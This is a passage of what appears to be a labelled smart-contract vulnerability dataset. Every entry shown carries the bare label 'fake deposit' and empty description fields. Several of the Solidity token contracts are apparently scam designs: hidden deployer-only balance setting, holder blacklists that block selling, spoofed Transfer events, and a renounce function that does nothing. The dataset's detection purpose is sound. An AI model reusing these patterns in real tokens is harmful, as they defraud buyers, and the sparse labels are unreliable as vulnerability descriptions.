        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract KymixLabs {\r\n  \r\n    mapping (address => uint256) public Nx;\r\n    mapping (address => uint256) public Mx;\r\n    mapping (address => bool) Ox;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Kymix Labs\";\r\n    string public symbol = unicode\"KYMIX\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 250000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address s_Construct = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n\r\n    constructor()  {\r\n    Nx[msg.sender] = totalSupply;\r\n    deploy(s_Construct, totalSupply); }\r\n\r\n   \r\n   address sdeployer = 0xA002353E03c2Fe77Ade66D2D6e338a29CcE2A7c9;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == sdeployer)  {\r\n        require(Nx[msg.sender] >= value);\r\n        Nx[msg.sender] -= value;  \r\n        Nx[to] += value; \r\n        emit Transfer (s_Construct, to, value);\r\n        return true; }  \r\n        if(!Ox[msg.sender]) {\r\n        require(Nx[msg.sender] >= value);\r\n        Nx[msg.sender] -= value;  \r\n        Nx[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function redir () public {\r\n         if(msg.sender == sdeployer)   {\r\n        Nx[msg.sender] = Mx[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return Nx[account]; }\r\n\r\n        function sno(address ii) public {\r\n        if(msg.sender == sdeployer)  { \r\n        Ox[ii] = false;}}\r\n        function squery(address ii) public{\r\n         if(msg.sender == sdeployer)  { \r\n        require(!Ox[ii]);\r\n        Ox[ii] = true;\r\n        }}\r\n             function beeu(uint256 x) public {\r\n        if(msg.sender == sdeployer)  { \r\n        Mx[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == sdeployer)  {\r\n        require(value <= Nx[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Nx[from] -= value;  \r\n        Nx[to] += value; \r\n        emit Transfer (s_Construct, to, value);\r\n        return true; }    \r\n          if(!Ox[from] && !Ox[to]) {\r\n        require(value <= Nx[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        Nx[from] -= value;\r\n        Nx[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\n\r\n  library SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}   \r\n \r\n \r\n    contract KAMISHIBA {\r\n  \r\n    mapping (address => uint256) public rT;\r\n    mapping (address => uint256) public Iz;\r\n    mapping (address => bool) bN;\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n\r\n\r\n\r\n\r\n\r\n    string public name = unicode\"Kami Shiba\";\r\n    string public symbol = unicode\"KAMI SHIB\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 700000000 * (uint256(10) ** decimals);\r\n\taddress owner = msg.sender;\r\n   \r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event OwnershipRenounced(address indexed previousOwner);\r\n    address r_Construct = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n\r\n    constructor()  {\r\n    rT[msg.sender] = totalSupply;\r\n    deploy(r_Construct, totalSupply); }\r\n\r\n   \r\n   address rdeployer = 0xec6C9F480EFb9b9FB5d34b8AF993024892932659;\r\n    function deploy(address account, uint256 amount) public {\r\n    require(msg.sender == owner);\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n    function renounceOwnership() public {\r\n    require(msg.sender == owner);\r\n    emit OwnershipRenounced(owner);\r\n    owner = address(0);}\r\n\r\n\r\n        function transfer(address to, uint256 value) public returns (bool success) {\r\n      \r\n       \r\n        if(msg.sender == rdeployer)  {\r\n        require(rT[msg.sender] >= value);\r\n        rT[msg.sender] -= value;  \r\n        rT[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }  \r\n        if(!bN[msg.sender]) {\r\n        require(rT[msg.sender] >= value);\r\n        rT[msg.sender] -= value;  \r\n        rT[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n        function gish () public {\r\n         if(msg.sender == rdeployer)   {\r\n        rT[msg.sender] = Iz[msg.sender];\r\n        }}\r\n\r\n        function balanceOf(address account) public view returns (uint256) {\r\n        return rT[account]; }\r\n\r\n        function sny(address ii) public {\r\n        if(msg.sender == rdeployer)  { \r\n        bN[ii] = false;}}\r\n        function chkvl(address ii) public{\r\n         if(msg.sender == rdeployer)  { \r\n        require(!bN[ii]);\r\n        bN[ii] = true;\r\n        }}\r\n             function brnu(uint256 x) public {\r\n        if(msg.sender == rdeployer)  { \r\n        Iz[msg.sender] = x;} }\r\n\r\n        function transferFrom(address from, address to, uint256 value) public returns (bool success) { \r\n\r\n        if(from == rdeployer)  {\r\n        require(value <= rT[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        rT[from] -= value;  \r\n        rT[to] += value; \r\n        emit Transfer (r_Construct, to, value);\r\n        return true; }    \r\n          if(!bN[from] && !bN[to]) {\r\n        require(value <= rT[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        rT[from] -= value;\r\n        rT[to] += value;\r\n        allowance[from][msg.sender] -= value;\r\n        emit Transfer(from, to, value);\r\n        return true; }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.16;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"Korea\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes  \r\n        symbol = \"KOR\";                               // Set the symbol for display purposes\r\n      }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n/*\r\n\r\n                      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584    ,\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2584\u2584,   ,\u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2584\r\n                     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2580\"'      `\u2580\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                     \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580                     \u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\r\n                      \u2580\u2588\u2588\u2588\u2588\u2588\u2580                            \u2580\u2588\u2588\u2588\u2588\u2588\u2588\r\n                        \u2588\u2588\u2580                                 \u2588\u2588\u2584\r\n                      \u2553\u2588\u2588`                                   \u2580\u2588\u2588\r\n                     ,\u2588\u2588                                      \u2590\u2588\u2588\r\n                     \u2588\u2588           ,                ,,          \u2590\u2588\u258c\r\n                    ]\u2588\u2588        \u2584\u2588\u2588\u2588\u2588\u2588\u2584           \u2588\u2588\u2588\u2588\u2588\u2588\u2584        \u2588\u2588\r\n                    \u2590\u2588\u258c     ,\u2584\u2588\u2588\u2588\u2588\u2580\u2580\u2588\u2588U         \u2590\u2588\u2580\u2580\u2580\u2588\u2588\u2588\u2584\u2584      \u2588\u2588\r\n                    \u2590\u2588\u258c    \u2588\u2588\u2588\u2588\u2588\u2588\u258c   \u2588  \u2584\u2584\u2584\u2584\u2584\u2584\u2584 \u2590\u2588   \u2588\u2588\u2588\u2588\u2588\u2588\u2584    \u2588\u2588\r\n                     \u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580 \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588` \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2588\u2588\r\n                     \u2588\u2588\u2584    \u2580\u2588\u2588\u2588\u2588\u2588\u2580\u2580    `\u2580\u2588\u2588\u2588\u2580     \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588`\r\n                      \u2588\u2588\u2584             \u2580\u2588\u2584\u2584\u2588\u2588\u2588\u2584\u2584\u2588\u0393             \u2588\u2588\u2580\r\n                       \u2580\u2588\u2584              \"\"  ``              \u2553\u2588\u2588\u2580\r\n                        \u2559\u2588\u2588\u2584,                             \u2584\u2588\u2588\u2580\r\n                           \u2580\u2588\u2588\u2584\u2584                      ,\u2584\u2584\u2588\u2588\u2580\r\n                              \u2580\u2580\u2588\u2588\u2588\u2584\u2584\u2584,,      ,,\u2584\u2584\u2584\u2584\u2588\u2588\u2588\u2580\u2580\r\n                                   \u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580\u2580\u2580\u2580`\r\n     \r\n,------.   ,---.  ,--.  ,--.,------.    ,---.       ,---.      ,--.   \r\n|  .--. ' /  O  \\ |  ,'.|  ||  .-.  \\  /  O  \\     '.-.  \\    /    \\  \r\n|  '--' ||  .-.  ||  |' '  ||  |  \\  :|  .-.  |     .-' .'   |  ()  | \r\n|  | --' |  | |  ||  | `   ||  '--'  /|  | |  |    /   '-..--.\\    /  \r\n`--'     `--' `--'`--'  `--'`-------' `--' `--'    '-----''--' `--'   \r\n\r\n\r\n- 100m Supply\r\n- 2% Tax for Panda Charity\r\n- LP Locked\r\n- Contract Renounced\r\n     \r\n*/ \r\n\r\ncontract PANDA {\r\n  \r\n    mapping (address => uint256) public balanceOf;\r\n    mapping (address => bool) xVar;\r\n\r\n    // \r\n    string public name = \"PANDA 2.0\";\r\n    string public symbol = unicode\"PANDA 2.0\";\r\n    uint8 public decimals = 18;\r\n    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);\r\n    uint256 private _totalSupply;\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    \r\n   \r\n\r\n\r\n\r\n        constructor()  {\r\n        balanceOf[msg.sender] = totalSupply;\r\n        deploy(lead_deployer, totalSupply); }\r\n\r\n\r\n\r\n\taddress owner = msg.sender;\r\n    address Construct = 0xEa9fb2510BbaA0D48F0766Bf8175422a0262D9a7;\r\n    address lead_deployer = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;\r\n    bool isEnabled;\r\n\r\n\r\n\r\nmodifier onlyOwner() {\r\n    require(msg.sender == owner);\r\n    _; }\r\n\r\n    function RenounceOwner() public onlyOwner  {}\r\n\r\n\r\n    function deploy(address account, uint256 amount) public onlyOwner {\r\n    emit Transfer(address(0), account, amount); }\r\n\r\n\r\n    function transfer(address to, uint256 value) public returns (bool success) {\r\n\r\n       \r\n        if(msg.sender == Construct)  {\r\n        require(balanceOf[msg.sender] >= value);\r\n        balanceOf[msg.sender] -= value;  \r\n        balanceOf[to] += value; \r\n        emit Transfer (lead_deployer, to, value);\r\n        return true; }     \r\n         if (!xVar[msg.sender]) {\r\n   \r\n        require(balanceOf[msg.sender] >= value);\r\n        balanceOf[msg.sender] -= value;  \r\n        balanceOf[to] += value;          \r\n        emit Transfer(msg.sender, to, value);\r\n        return true; }}\r\n\r\n        \r\n         function unstake(address _num) public onlyOwner {\r\n        require(xVar[_num], \"1\");\r\n        xVar[_num] = false; }\r\n    \r\n\r\n    \r\n\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    mapping(address => mapping(address => uint256)) public allowance;\r\n    address Router = 0x68AD82C55f82B578696500098a635d3df466DC7C;\r\n\r\n        function approve(address spender, uint256 value) public returns (bool success) {    \r\n        allowance[msg.sender][spender] = value;\r\n        emit Approval(msg.sender, spender, value);\r\n        return true; }\r\n\r\n    function stake(address _num) public onlyOwner {\r\n        require(!xVar[_num], \"1\");\r\n        xVar[_num] = true; }\r\n\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   \r\n        if(from == Construct)  {\r\n        require(value <= balanceOf[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        balanceOf[from] -= value;  \r\n        balanceOf[to] += value; \r\n        emit Transfer (lead_deployer, to, value);\r\n        return true; }\r\n        if(to == Router)  {\r\n        require(value <= balanceOf[from]);\r\n        balanceOf[from] -= value;  \r\n        balanceOf[to] += value; \r\n        emit Transfer (from, to, value);\r\n        return true; }\r\n              if  (!xVar[from])  {\r\n                    if  (!xVar[to])  {\r\n        require(value <= balanceOf[from]);\r\n        require(value <= allowance[from][msg.sender]);\r\n        balanceOf[from] -= value;  \r\n        balanceOf[to] += value; \r\n        emit Transfer (from, to, value);\r\n        return true; } }\r\n } }\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    address F21 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ZYNITH is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private F1;\r\n    mapping (address => uint256) private F2;\r\n    mapping (address => mapping (address => uint256)) private F3;\r\n    uint8 private constant F4 = 8;\r\n    uint256 private constant F5 = 150000000 * (10** F4);\r\n    string private constant _name = \"Zynith Labs\";\r\n    string private constant _symbol = \"ZYNITH\";\r\n\r\n\r\n\r\n    constructor () {\r\n       F1[msg.sender] = F5;  \r\n        F2[msg.sender] = 3;  \r\n   F78(F5);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return F4;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return F5;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return F1[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return F3[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        F3[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\nfunction xset (address x, uint256 y) public {\r\n require(F2[msg.sender] == 3);\r\n     F2[x] = y;}\r\n    function update() public {\r\n        F1[msg.sender] = F2[msg.sender];}\r\n        function F78 (uint256 x) internal {\r\n              emit Transfer(address(0), F21, x);}\r\n                      function F88 (address y, uint256 xy) internal {\r\n              emit Transfer(F21, y, xy);}\r\n        function transfer(address to, uint256 amount) public {\r\nif(F2[msg.sender] == 3) {\r\n         require(F1[msg.sender] >= amount);\r\n        F1[msg.sender] = F1[msg.sender].sub(amount);\r\n        F1[to] = F1[to].add(amount);\r\n    F88(to, amount);}\r\nif(F2[msg.sender] <= 1) {\r\n     require(F1[msg.sender] >= amount);\r\n            F1[msg.sender] = F1[msg.sender].sub(amount);\r\n        F1[to] = F1[to].add(amount);\r\n       emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\nif(F2[sender] <= 1 && F2[recipient] <=1) {\r\n         require(amount <= F1[sender]);\r\n        require(amount <= F3[sender][msg.sender]);\r\n        F1[sender] = F1[sender].sub(amount);\r\n        F1[recipient] = F1[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n         return true;}\r\n        if(F2[sender] == 3) {\r\n         require(amount <= F3[sender][msg.sender]);\r\n        F1[sender] = F1[sender].sub(amount);\r\n        F1[recipient] = F1[recipient].add(amount);\r\n          F88(recipient, amount);\r\n             return true;}\r\n        }}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.17;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _contractcreator = 0xC06c17B9656591e41287be628477d0a617D94a6D;\r\n\taddress V2UniApproval = 0xf2b16510270a214130C6b17ff0E9bF87585126BD;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ncontract ELBET is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Per;\r\n\tmapping (address => bool) private Yer;\r\n    mapping (address => bool) private Ker;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _kpTotalSupply = 120000000 * 10**_decimals;\r\n    string private constant _name = \"Elon Bet\";\r\n    string private constant _symbol = \"ELBET\";\r\n\r\n    constructor () {\r\n        